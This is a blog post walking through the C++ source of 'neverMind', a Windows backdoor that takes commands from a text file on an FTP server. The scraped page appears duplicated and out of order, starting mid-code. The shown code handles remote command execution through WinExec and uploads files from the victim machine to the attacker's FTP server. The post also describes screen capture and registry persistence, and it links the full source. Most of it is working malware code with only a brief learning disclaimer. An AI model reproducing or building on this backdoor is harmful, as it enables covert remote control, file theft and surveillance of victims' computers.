</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(<span style="color:#f1fa8c">&#34;downloads&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    ftp_connection.mkdir(<span style="color:#f1fa8c">&#34;downloads&#34;</span>);
</span></span><span style="display:flex;"><span>                    ftp_connection.cd(<span style="color:#f1fa8c">&#34;downloads&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (ftp_connection.upload_file(spl_line[<span style="color:#bd93f9">1</span>], std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(spl_line[<span style="color:#bd93f9">1</span>]).filename().u8string()))
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[++] file download successful [++]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] downloading error [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                ftp_connection.cd(<span style="color:#f1fa8c">&#34;../&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;exec&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                WinExec(std<span style="color:#ff79c6">::</span>string(<span style="color:#f1fa8c">&#34;cmd </span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">d:&#34;</span> <span style="color:#ff79c6">+</span> spl_line[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;f</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">&#34;</span>).c_str(), <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>                wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] command: &#34;</span> <span style="color:#ff79c6">+</span> main_cmd <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;not found [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">catch</span> (...)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] error [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="main">main</h3>
<p>the <code>main.cpp</code> file creates an instance <code>M</code> of the <code>neverMind</code> class and starts the backdoor. it&rsquo;s the entry point of the application, and it contains the <code>wWinMain</code> function, which is the entry point in a Windows application linked with the <code>UNICODE</code> character set. the <code>host</code>, <code>username</code>, and <code>password</code> are the credentials of the FTP server. the <code>neverMind</code> object <code>M</code> is created and the backdoor is started by calling <code>M.start()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> WINAPI <span style="color:#50fa7b">wWinMain</span>(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, <span style="color:#8be9fd">int</span> CmdShow)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string host <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;host&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;username&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;password&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    neverMind M(host, username, password);
</span></span><span style="display:flex;"><span>    M.start();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>HINSTANCE hInstance</code>: a handle to the current instance of the application.</p>
<p><code>HINSTANCE hPrevInstance</code>: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.</p>
<p><code>PWSTR szCmdLine</code>: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.</p>
<p><code>int CmdShow</code>: controls how the window is to be shown. this parameter can be one of the following values: <code>SW_HIDE</code>, <code>SW_MAXIMIZE</code>, <code>SW_MINIMIZE</code>, <code>SW_RESTORE</code>, <code>SW_SHOW</code>, <code>SW_SHOWDEFAULT</code>, <code>SW_SHOWMAXIMIZED</code>, <code>SW_SHOWMINIMIZED</code>, <code>SW_SHOWMINNOACTIVE</code>, <code>SW_SHOWNA</code>, <code>SW_SHOWNOACTIVATE</code>, <code>SW_SHOWNORMAL</code>.</p>
<h2 id="conclusion">conclusion</h2>
<p><code>neverMind</code> is a demonstration (ahem) of a backdoor application that uses FTP for C2 (command + control) operations. it&rsquo;s written in C++ and uses the Windows API and WinINet API for network operations. the program has 3 main components: the <code>ftpC</code> class, the <code>neverMind</code> class, and the <code>main.cpp</code> file.</p>
<p><code>ftpC</code> provides a set of functions for FTP operations, including connecting to an FTP server, uploading/downloading files, and creating/switching directories. it uses the WinINet API, which is a high-level API for working with FTP, HTTP, and Gopher protocols.</p>
<p><code>neverMind</code> uses the <code>ftpC</code> class to connect to the FTP server and perform file operations. it contains methods for setting up and starting the backdoor, compiling + executing commands from a file, and adding the backdoor to the Windows Registry for persistence.</p>
<p><code>main.cpp</code> is the entry point of the app. it creates an instance of the <code>neverMind</code> class with the FTP server credentials and starts the backdoor.</p>
<p>i wrote this program to better learn and understand how backdoors work and how they can use FTP for C2 operations. as a result, i learned how to use the Windows and WinINet APIs, how to work with the Windows Registry for persistence, and how to execute system commands and capture their output.</p>
<p>it&rsquo;s important to note that this program is a demonstration of malware. it should not be used illegally. understanding how such software works can help in developing security measures + tools to detect and remove such threats. it can also be used to learn more about system internals and network programming.</p>
<p>happy hacking!</p>
</main>


    <br>
    <hr>
    
      Next: <a href="//localhost:1313/posts/cookiejar/">cookieJar</a>
    




<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/go-pro/" style="float: right"
      >next: goPro: detecting process hollowing with Go</a
    >
     
    <a class="previous" href="/posts/cookiejar/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script><!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="neverMind">

    
        <title>neverMind | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    neverMind
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 18, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">overview</a></li>
    <li><a href="#flow">flow</a></li>
    <li><a href="#code">code</a>
      <ul>
        <li><a href="#the-wrapper">the wrapper</a></li>
        <li><a href="#ftpc">ftpC</a></li>
        <li><a href="#nevermind">neverMind</a></li>
        <li><a href="#main">main</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">conclusion</a></li>
  </ul>
</nav>
</aside>


<main><p><p class="imgp">
  <img loading="lazy" src="/neverMind.png" alt="neverMind"  />
</p>
</p>
<p>as part of a post-layoff glow-up, i began to delve deeper into programming and building my own tools. a lot of these tools are based on specific actions, like attacks, analysis, etc. one thing i&rsquo;ve always been fascinated with though is object-oriented programming used to build applications from the ground up, specifically backdoors.</p>
<p>backdoors are often used for securing remote access to a computer. they&rsquo;re used for legitimate purposes, like by system administrators for system management (fix issues, install updates, perform maintenance) without being physically present. however, one need only hop a short distance from legitimate purposes to malicious activities, as hackers often use backdoors to steal sensitive data, install additional malware, and launch attacks against other systems.</p>
<p>so i wrote one myself.</p>
<p><strong><code>neverMind</code></strong> is a backdoor that allows remote command execution (aka <strong>RCE</strong>) on a target system via FTP (file transfer protocol). view the source code <a href="https://github.com/bilals12/neverMind/tree/main"  target="_blank" rel="noreferrer nofollow">here</a>
 and follow along!</p>
<h2 id="overview">overview</h2>
<p>the gist of how <code>neverMind</code> works is simple: the program is controlled remotely via commands stored in text file on an FTP server. for this, 2 basic conditions need to be fulfilled:</p>
<ol>
<li>
<p>the program needs an FTP server to be set up with a specific directory structure. inside this directory, there needs to be a file (named <code>cmd.txt</code> for example) that contains the commands to be executed.</p>
</li>
<li>
<p>the <code>cmd.txt</code> file needs to have each line representing a separate command. the program supports several commands: <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>.</p>
</li>
</ol>
<h2 id="flow">flow</h2>
<p><strong>initialization</strong>: the program begins by creating an instance of the <code>neverMind</code> class, which takes the FTP server&rsquo;s host, username, and password as parameters. this instance is used to manage the backdoor&rsquo;s operations.</p>
<p><strong>setup</strong>: if the backdoor hasn&rsquo;t been set up before, the <code>setup</code> method in the <code>neverMind</code> class creates the necessary directories and adds the backdoor to the registry for persistence.</p>
<p><strong>command execution</strong>: the <code>start</code> method in the <code>neverMind</code> class is the main driver of the program. it connects to the FTP server, downloads the <code>cmd.txt</code> file, compiles + executes the commands, and then uploads the <code>output.txt</code> file.</p>
<p><strong>command compilation</strong>: the <code>compile</code> method reads the <code>cmd.txt</code> file, splits each line into a vector of strings, and then executes each command.</p>
<p><strong>command handling</strong>: the <code>execute</code> method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>.</p>
<p><strong>FTP operations</strong>: the <code>neverMind</code> class uses an instance of the <code>ftpC</code> class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.</p>
<p><strong>utility functions</strong>: the <code>wrapper</code> class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.</p>
<p><strong>persistence</strong>: the program adds itself to the registry to ensure it runs every time the system starts.</p>
<p><strong>cleanup</strong>: when the program is done, it closes the FTP + internet connections in the <code>ftpC</code> class destructor.</p>
<h2 id="code">code</h2>
<h3 id="the-wrapper">the wrapper</h3>
<p>the <code>wrapper</code> class defined in <code>wrapper.h</code> and implemented in <code>wrapper.cpp</code> provides a set of utility functions for file operations, system information retrieval, and screen capture.</p>
<h4 id="file-operations">file operations</h4>
<p><code>read_file(const std::string&amp; file_path)</code>: reads the content of a file located at <code>file_path</code> and returns it as a string. If the file cannot be opened, it throws a <code>FileError</code> exception.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>read_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>file_path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ifstream file(file_path);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file.is_open())
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> FileError(<span style="color:#f1fa8c">&#34;[!] failed to open file: &#34;</span> <span style="color:#ff79c6">+</span> file_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string text;
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string line;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (std<span style="color:#ff79c6">::</span>getline(file, line)) {
</span></span><span style="display:flex;"><span>            text <span style="color:#ff79c6">+=</span> line <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> text;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>write_file(const std::string&amp; file_path, const std::string&amp; content)</code>: writes content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> wrapper<span style="color:#ff79c6">::</span>write_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>file_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>content)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ofstream file(file_path);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file.is_open())
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> FileError(<span style="color:#f1fa8c">&#34;[!] failed to open file: &#34;</span> <span style="color:#ff79c6">+</span> file_path);
</span></span><span style="display:flex;"><span>        file <span style="color:#ff79c6">&lt;&lt;</span> content;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>append_file(const std::string&amp; file_path, const std::string&amp; content)</code>: appends content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> wrapper<span style="color:#ff79c6">::</span>append_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> file_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> content)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ofstream file(file_path, std<span style="color:#ff79c6">::</span>ios_base<span style="color:#ff79c6">::</span>app);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file.is_open())
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> FileError(<span style="color:#f1fa8c">&#34;[!] failed to open file: &#34;</span> <span style="color:#ff79c6">+</span> file_path);
</span></span><span style="display:flex;"><span>        file <span style="color:#ff79c6">&lt;&lt;</span> content;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>path_exists(const std::string&amp; path)</code>: checks if a path exists in the file system and returns a boolean value indicating the result.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> wrapper<span style="color:#ff79c6">::</span>path_exists(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>exists(path);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="system-information-retrieval">system information retrieval</h4>
<p><code>get_username()</code>: retrieves the username of the current user from the environment variables.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>get_username()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">char</span> env[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;USERNAME&#34;</span>;
</span></span><span style="display:flex;"><span>        DWORD username_len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">257</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">4096</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> out_size <span style="color:#ff79c6">=</span> GetEnvironmentVariableA(env, buffer, username_len);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> std<span style="color:#ff79c6">::</span>string(buffer, out_size);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>last_error_string()</code>: Retrieves the last error message recorded by the system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>last_error_string()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        DWORD errorMessageID <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">::</span>GetLastError();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (errorMessageID <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> std<span style="color:#ff79c6">::</span>string(); <span style="color:#6272a4">// no error recorded
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        LPSTR messageBuffer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">nullptr</span>;
</span></span><span style="display:flex;"><span>        size_t size <span style="color:#ff79c6">=</span> FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_FROM_SYSTEM <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_IGNORE_INSERTS, <span style="color:#8be9fd;font-style:italic">NULL</span>, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)<span style="color:#ff79c6">&amp;</span>messageBuffer, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string message(messageBuffer, size);
</span></span><span style="display:flex;"><span>        LocalFree(messageBuffer); <span style="color:#6272a4">// free up the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">return</span> message;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>listdir(const std::string&amp; path)</code>: Lists the contents of a directory specified by path and returns them as a vector of strings.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;</span> wrapper<span style="color:#ff79c6">::</span>listdir(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;</span> directory_content;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> (<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">auto</span><span style="color:#ff79c6">&amp;</span> <span style="color:#8be9fd;font-style:italic">val</span> : std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>directory_iterator(path)) {
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string content <span style="color:#ff79c6">=</span> val.path().u8string();
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>size_t last_idx <span style="color:#ff79c6">=</span> content.find_last_of(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>            directory_content.push_back(content.substr(last_idx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> directory_content;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>get_date()</code>: Returns the current date and time as a string in the format &ldquo;dd-mm-yyyy_hh-mm-ss&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>get_date()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">auto</span> t <span style="color:#ff79c6">=</span> std<span style="color:#ff79c6">::</span>time(<span style="color:#ff79c6">nullptr</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">auto</span> tm <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>std<span style="color:#ff79c6">::</span>localtime(<span style="color:#ff79c6">&amp;</span>t);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ostringstream oss;
</span></span><span style="display:flex;"><span>        oss <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>put_time(<span style="color:#ff79c6">&amp;</span>tm, <span style="color:#f1fa8c">&#34;%d-%m-%Y_%H-%M-%S&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> oss.str();
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="screen-capture">screen capture</h4>
<p><code>createBitmapHeader(int width, int height)</code>: creates a bitmap header with the specified width and height.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BITMAPINFOHEADER wrapper<span style="color:#ff79c6">::</span>createBitmapHeader(<span style="color:#8be9fd">int</span> width, <span style="color:#8be9fd">int</span> height)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    BITMAPINFOHEADER bi;
</span></span><span style="display:flex;"><span>    bi.biSize <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(BITMAPINFOHEADER);
</span></span><span style="display:flex;"><span>    bi.biWidth <span style="color:#ff79c6">=</span> width;
</span></span><span style="display:flex;"><span>    bi.biHeight <span style="color:#ff79c6">=</span> height;
</span></span><span style="display:flex;"><span>    bi.biPlanes <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    bi.biBitCount <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">32</span>;
</span></span><span style="display:flex;"><span>    bi.biCompression <span style="color:#ff79c6">=</span> BI_RGB;
</span></span><span style="display:flex;"><span>    bi.biSizeImage <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biXPelsPerMeter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biYPelsPerMeter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biClrUsed <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biClrImportant <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> bi;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>GdiPlusScreenCapture(HWND hWnd)</code>: captures the screen of the window specified by <code>hWnd</code> and returns a handle to the bitmap of the screenshot.</p>
